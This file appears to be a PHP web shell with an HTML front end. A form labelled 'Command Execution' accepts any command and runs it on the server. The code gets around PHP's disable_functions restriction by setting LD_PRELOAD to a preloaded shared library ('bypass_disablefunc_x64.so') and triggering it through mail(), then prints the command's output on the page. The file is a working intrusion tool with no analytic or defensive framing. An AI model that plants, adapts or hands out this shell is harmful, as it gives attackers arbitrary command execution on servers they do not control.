<!DOCTYPE html>
<html>
<head>
    <title>Command Execution</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
            background-color: #f9f9f9;
        }
        .container {
            max-width: 90%;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        .sticky-form {
            display: flex;
            gap: 10px;
            padding: 10px;
            background-color: #fff;
            border-bottom: 2px solid #ccc;
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        label {
            font-weight: bold;
            align-self: center;
        }
        input[type="text"] {
            flex: 1;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        input[type="submit"] {
            padding: 10px;
            font-size: 16px;
            color: #fff;
            background-color: #007BFF;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #0056b3;
        }
        .output {
            margin-top: 20px;
            padding: 10px;
            background-color: #f1f1f1;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        pre {
            background-color: #333;
            color: #fff;
            padding: 10px;
            border-radius: 4px;
            overflow: auto;
        }
        code {
            display: block;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Command Execution</h1>
        <form method="GET" action="" class="sticky-form">
            <label for="cmd">Enter Command:</label>
            <input type="text" id="cmd" name="cmd" required>
            <input type="submit" value="Execute">
        </form>

        <?php
        if (isset($_GET['cmd'])) {
            // Set the output path
            $out_path = '/tmp/xx';
            
            // Get the command from the input box
            $cmd = $_GET["cmd"];

            // Construct the command line
            $evil_cmdline = escapeshellcmd($cmd) . " > " . escapeshellarg($out_path) . " 2>&1";
            echo "<p><b>cmdline</b>: " . htmlspecialchars($evil_cmdline) . "</p>";

            // Set the environment variables
            putenv("EVIL_CMDLINE=" . $evil_cmdline);

            // Load the .so file from the current directory
            $so_path = './bypass_disablefunc_x64.so';
            putenv("LD_PRELOAD=" . $so_path);

            // Trigger the payload
            mail("", "", "", "");

            // Display the output
            $output = htmlspecialchars(file_get_contents($out_path));
            echo "<div class='output'><p><b>Output:</b></p><pre><code>{$output}</code></pre></div>"; 

            // Clean up the output file
            unlink($out_path);
        }
        ?>
    </div>
</body>
</html>
